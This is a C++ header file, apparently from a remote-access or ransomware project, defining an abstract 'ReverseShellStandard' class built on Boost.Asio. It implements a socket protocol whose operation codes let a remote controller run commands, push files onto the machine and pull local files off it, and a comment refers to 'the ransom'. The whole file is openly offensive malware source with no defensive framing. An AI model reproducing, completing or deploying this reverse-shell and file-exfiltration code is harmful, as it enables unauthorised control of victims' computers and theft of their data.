#pragma once

#define _WIN32_WINDOWS 0x0A00
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <boost/asio.hpp>
#include <fstream>
#include <filesystem>
#include <iostream>

class ReverseShellStandard 
{
	using IoService = boost::asio::io_service;
	#define DEFAULT_BUFFER_SIZE 1024

protected:
	ReverseShellStandard()
		: m_ioService(IoService()), m_socket(m_ioService){}

	~ReverseShellStandard()
	{
		m_socket.close();
		m_ioService.stop();
	}

	void OpenFileFor(const std::string& filePath, int mode)
	{
		m_file.open(filePath, mode);
		if (!m_file)
			throw; // TODO - throw specific exception
	}

	size_t Send(int numberToSend)
	{
		return Send(std::to_string(numberToSend));
	}

	size_t Send(const std::string& message)
	{
		auto request = message + m_delimiter;
		auto buf = boost::asio::buffer(request, request.size());
		return Send(buf);
	}

	size_t Send(const boost::asio::mutable_buffer& t_buffer)
	{
		auto bytesSent = boost::asio::write(m_socket, t_buffer, m_errorCode);
		if (m_errorCode)
			throw; // TODO - handle error (reset the connection & reset the m_errorCode to 0)

		return bytesSent;
	}

	std::string Response()
	{
		auto responseSize = boost::asio::read_until(m_socket, m_responseBuf, m_delimiter, m_errorCode);
		if (m_errorCode)
			throw; // TODO - handle error

		return CleanReponse(responseSize);
	}

private:
	std::string CleanReponse(size_t responseSize)
	{
		std::string response(
			buffers_begin(m_responseBuf.data()),
			buffers_begin(m_responseBuf.data()) + responseSize - m_delimiter.size()
		);
		m_responseBuf.consume(responseSize);

		return response;
	}

protected:
	enum OperationType { RUN_COMMAND = 1, DOWNLOAD_FILE, UPLOAD_FILE, INVALID };
	OperationType GetOperationType(const std::string& operation)
	{
		std::unordered_map<std::string, OperationType> operations
		{
			{"1", RUN_COMMAND},
			{"2", DOWNLOAD_FILE},
			{"3", UPLOAD_FILE}
		};

		if (!operations.count(operation))
			return INVALID;

		return operations[operation];
	}

	void UploadFile(const std::string& localFilePath)
	{
		auto fileSize = std::filesystem::file_size(localFilePath);
		Send(std::to_string(fileSize));
		OpenFileFor(localFilePath, std::ios::in | std::ios::binary);
		UploadFileBytes(fileSize);
	}

private:
	void UploadFileBytes(int fileSize)
	{
		size_t bytesSent = 0;
		while (fileSize > 0)
		{
			std::array<char, DEFAULT_BUFFER_SIZE> response;
			BytesFromFileToBuffer(response);
			size_t bufferSize(m_file.gcount());
			auto buf = boost::asio::buffer(response.data(), bufferSize);
			bytesSent += Send(buf);

			fileSize -= bufferSize;
		}
		m_file.close();

		std::cout << "Total bytes sent: " << bytesSent << std::endl;
	}

	void BytesFromFileToBuffer(std::array<char, DEFAULT_BUFFER_SIZE>& response)
	{
		m_file.read(response.data(), response.size());
		if (m_file.fail() && !m_file.eof())
			throw std::fstream::failure("Failed while reading file");
	}

protected:
	void DownloadFile(const std::string& filePath)
	{
		auto amountOfBytes = std::stoi(Response());
		BytesFromSocketToFile(amountOfBytes);
		std::cout << "Finished Downloading " << filePath << std::endl;
	}

private:
	void BytesFromSocketToFile(int amountOfBytes)
	{
		WriteLeakedBytes();
		while (m_file.tellp() < amountOfBytes)
		{
			std::array<char, DEFAULT_BUFFER_SIZE> response;
			auto bufferSize = std::min(static_cast<int>(m_socket.available()), DEFAULT_BUFFER_SIZE);
			auto buf = boost::asio::buffer(response, bufferSize);
			auto responseSize = boost::asio::read(m_socket, buf, m_errorCode);
			m_file.write(response.data(), responseSize);
			std::cout << "Target: " << amountOfBytes << "   Current: " << m_file.tellp() << " Response size: " << responseSize << std::endl;
		}
		std::cout << "Closing file stream" << std::endl;
		m_file.close();
	}

	void WriteLeakedBytes()
	{
		std::istream requestStream(&m_responseBuf);
		do {
			std::array<char, DEFAULT_BUFFER_SIZE> response;
			requestStream.read(response.data(), response.size());
			std::cout << "==================================== " << requestStream.gcount() << " ====================================" << std::endl;
			m_file.write(response.data(), requestStream.gcount());
		} while (requestStream.gcount() > 0);
	}

protected:
	//TODO - In the ransom move this to another place
	bool IsRegularFileExists(const std::filesystem::path& filePath)
	{
		return (std::filesystem::exists(filePath) && std::filesystem::is_regular_file(filePath));
	}

protected:
	IoService m_ioService;
	boost::asio::ip::tcp::socket m_socket;
	boost::asio::streambuf m_responseBuf;
	const std::string m_delimiter = "#\r\n$\r\n#";
	std::fstream m_file;

public:
	boost::system::error_code m_errorCode;

	virtual void Connect() = 0;
	virtual OperationType ReadOperationType() = 0;
	virtual void RunCommand() = 0;
	virtual void DownloadFile() = 0;
	virtual void UploadFile() = 0;
	virtual void InvalidOperation() = 0;
};